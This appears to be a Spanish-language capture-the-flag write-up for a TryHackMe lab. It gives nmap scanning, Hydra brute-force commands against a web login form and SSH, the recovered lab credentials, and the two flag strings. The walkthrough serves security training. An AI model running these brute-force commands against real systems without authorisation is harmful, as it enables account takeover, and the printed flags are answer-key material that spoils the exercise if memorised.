## 1. Escaneo Inicial

bash

Copy

sudo nmap -sS 10.10.123.45 -sV -sC

**Resultados:**

- Puerto 22 (SSH) abierto → OpenSSH 7.6p1
    
- Puerto 80 (HTTP) abierto → Apache 2.4.29 (Ubuntu)
    

## 2. Fuerza Bruta al Formulario Web

**Inspección del formulario:**

1. Accedí a `http://10.10.123.45/login/`
    
2. Verifiqué el código fuente (Ctrl+U)
    
3. Confirmé que usa método POST con campos:
    
    - `username`
        
    - `password`
        

**Comando Hydra:**

bash

Copy

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.123.45 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -t 4

**Credenciales encontradas:**

- Usuario: **molly**
    
- Contraseña: **sunshine**
    

## 3. Acceso al Panel Web

- Ingresé las credenciales en el formulario
    
- Obtenido **Flag 1** en el panel de usuario:  
    `THM{2673a7dd116de68e85c48ec0b1f2612e}`
    

## 4. Fuerza Bruta a SSH

**Comando Hydra:**

bash

Copy

hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.123.45 -t 4

**Credenciales SSH:**

- Mismo usuario: **molly**
    
- Contraseña diferente: **butterfly**
    

## 5. Acceso por SSH y Flag 2

bash

Copy

ssh molly@10.10.123.45
Password: butterfly

**Búsqueda de la flag:**

bash

Copy

find / -name "*flag*" 2>/dev/null
cat /home/molly/flag2.txt

**Flag 2 obtenida:**  
`THM{c8eeb0468febbadea859baeb33b2541b}`